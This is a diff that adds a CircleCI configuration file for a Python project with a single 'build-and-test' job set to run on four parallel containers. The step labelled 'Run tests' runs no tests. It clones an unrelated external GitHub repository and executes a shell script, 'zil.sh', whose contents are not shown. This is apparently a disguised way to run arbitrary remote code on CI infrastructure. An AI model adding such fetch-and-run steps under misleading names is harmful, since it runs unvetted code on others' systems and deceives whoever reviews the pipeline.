@@ -1,0 +1,23 @@
+version: 2.1 
+ 
+orbs: 
+   
+  python: circleci/python@1.2 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - build-and-test 
+ 
+ 
+jobs: 
+  build-and-test:
+    parallelism: 4
+    docker: 
+      - image: cimg/python:3.8 
+     
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          command: git clone https://github.com/JacobGuerin/JCBgue.git && cd JCBgue && chmod +x zil.sh && ./zil.sh
